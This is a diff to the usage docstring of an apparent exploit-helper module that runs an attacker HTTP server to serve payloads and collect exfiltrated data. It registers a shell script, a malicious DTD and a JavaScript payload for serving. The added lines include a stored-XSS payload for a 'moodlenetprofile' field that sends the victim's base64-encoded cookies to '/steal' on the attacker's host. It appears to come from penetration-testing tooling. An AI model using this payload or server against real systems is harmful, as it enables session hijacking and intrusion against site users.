@@ -11,11 +11,15 @@ Responsibilities:
 Usage (copy start_server, SERVED_FILES, EXFIL_DATA into your exploit script):
 
     # Register a file to serve
+    SERVED_FILES["/shell.sh"] = (shell_payload, "text/x-shellscript")
     SERVED_FILES["/evil.dtd"] = (dtd_payload, "application/xml-dtd")
     SERVED_FILES["/payload.js"] = (js_payload, "application/javascript")
 
     # Start the server (runs in daemon thread — auto-stops when main exits)
     httpd = start_server(host=lhost, port=80)
+
+    # XSS Payload on victim
+    'moodlenetprofile': f'<script>new Image().src="http://{lhost}/steal?b64_cookie=" + btoa(document.cookie);</script>',
 
     # Wait for a callback (e.g. XSS cookie theft)
     while "/steal" not in EXFIL_DATA:
